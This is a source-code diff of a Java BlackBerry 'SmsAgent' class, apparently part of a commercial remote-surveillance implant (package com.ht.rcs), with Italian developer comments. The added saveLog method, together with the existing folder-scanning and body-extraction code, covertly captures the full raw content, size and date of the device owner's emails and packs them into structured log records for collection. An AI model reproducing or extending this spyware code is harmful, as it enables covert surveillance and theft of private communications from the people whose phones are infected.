@@ -1,5 +1,6 @@
 package com.ht.rcs.blackberry.agent;
 
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
@@ -19,10 +20,15 @@ import net.rim.blackberry.api.mail.Transport;
 import net.rim.device.api.io.http.HttpDateParser;
 import net.rim.device.api.servicebook.ServiceBook;
 import net.rim.device.api.servicebook.ServiceRecord;
+import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.IntHashtable;
 
 import com.ht.rcs.blackberry.config.Keys;
+import com.ht.rcs.blackberry.log.Log;
+import com.ht.rcs.blackberry.log.LogType;
 import com.ht.rcs.blackberry.log.Markup;
+import com.ht.rcs.blackberry.utils.Check;
+import com.ht.rcs.blackberry.utils.DateTime;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
@@ -31,20 +37,20 @@ import com.ht.rcs.blackberry.utils.Utils;
  * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
  * 
  * 118  #define LOGTYPE_MAIL_RAW                        0x1001
-119 #define LOGTYPE_MAIL                            0x0210
+ 119 #define LOGTYPE_MAIL                            0x0210
 
 
  * 198  typedef struct _MailAdditionalData {
-199         UINT uVersion;
-200                 #define LOG_MAIL_VERSION 2009070301
-201         UINT uFlags;
-202         UINT uSize;
-203         FILETIME ftTime;
-204 } MailAdditionalData, *pMailAdditionalData;
+ 199         UINT uVersion;
+ 200                 #define LOG_MAIL_VERSION 2009070301
+ 201         UINT uFlags;
+ 202         UINT uSize;
+ 203         FILETIME ftTime;
+ 204 } MailAdditionalData, *pMailAdditionalData;
 
-http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp
+ http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp
 
-uFlags = 1 : body retrieved
+ uFlags = 1 : body retrieved
  0: non ha superato i controlli di size, il body viene tagliato
 
 
@@ -74,8 +80,15 @@ public class SmsAgent extends Agent {
     protected static final int[] HEADER_KEYS = { Message.RecipientType.TO,
             Message.RecipientType.CC, Message.RecipientType.BCC };
 
+    private static final int MAIL_VERSION = 2009070301;
+
     public SmsAgent(boolean agentStatus) {
         super(AGENT_SMS, agentStatus, true, "SmsAgent");
+
+        // #ifdef DBC
+        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.MAIL_RAW,
+                "Wrong Conversion");
+        // #endif
     }
 
     protected SmsAgent(boolean agentStatus, byte[] confParams) {
@@ -178,7 +191,7 @@ public class SmsAgent extends Agent {
      * 
      * @param subfolders
      */
-    public static void scanFolder(Folder[] subfolders) {
+    public void scanFolder(Folder[] subfolders) {
         Folder[] dirs;
         long dataArrivo, filterDate;
         // Date emailDate;
@@ -254,7 +267,9 @@ public class SmsAgent extends Agent {
                     }
 
                     if (printEmail == true) {
-                        
+
+                        saveLog(message);
+
                         debug
                                 .trace("-------------------------------- e-mail numero "
                                         + j
@@ -319,6 +334,50 @@ public class SmsAgent extends Agent {
         }
     }
 
+    private void saveLog(Message message) {
+
+        ByteArrayOutputStream os = null;
+        try {
+            os = new ByteArrayOutputStream();
+            message.writeTo(os);                      
+            byte[] content = os.toByteArray();
+            
+            String messageContent= new String(content);
+            debug.trace(messageContent);
+
+            int flags = 1;
+            int size = message.getSize();
+            DateTime filetime = new DateTime(message.getReceivedDate());
+
+            byte[] additionalData = new byte[20];
+            /*
+             * UINT uVersion; 200 #define LOG_MAIL_VERSION 2009070301 201 UINT
+             * uFlags; 202 UINT uSize; 203 FILETIME ftTime;
+             */
+
+            DataBuffer databuffer = new DataBuffer(additionalData, 0, 20, false);
+            databuffer.writeInt(MAIL_VERSION);
+            databuffer.writeInt(flags);
+            databuffer.writeInt(size);
+            databuffer.writeLong(filetime.getTicks());
+            Check.ensures(additionalData.length == 20, "Wrong buffer size");
+
+            log.createLog(additionalData);
+            log.writeLog(content);
+            log.close();
+        } catch (IOException e) {
+            // TODO Auto-generated catch block
+            e.printStackTrace();
+        } finally {
+            if (os != null) {
+                try {
+                    os.close();
+                } catch (IOException e) {
+                }
+            }
+        }
+    }
+
     /**
      * controlla se il messaggio e' mime e ne stampa il contenuto
      * 
@@ -358,7 +417,7 @@ public class SmsAgent extends Agent {
                 if (plainText.length() != 0) {
                     if (FILTERDIM == true && plainText.length() > BODYDIM) {
                         // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
-                        plainText = plainText.substring(0, (BODYDIM )); // l'unita' di misura e' il kbyte
+                        plainText = plainText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
                     }
                     debug.trace("Testo dell'email :" + plainText);
                 }
@@ -374,7 +433,7 @@ public class SmsAgent extends Agent {
                         String htmlText = new String((byte[]) obj);
                         // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
                         if (FILTERDIM == true && htmlText.length() > BODYDIM) {
-                            htmlText = htmlText.substring(0, (BODYDIM )); // l'unita' di misura e' il kbyte
+                            htmlText = htmlText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
                         }
                         debug.trace("Testo dell'email MIME: " + htmlText);
                     }
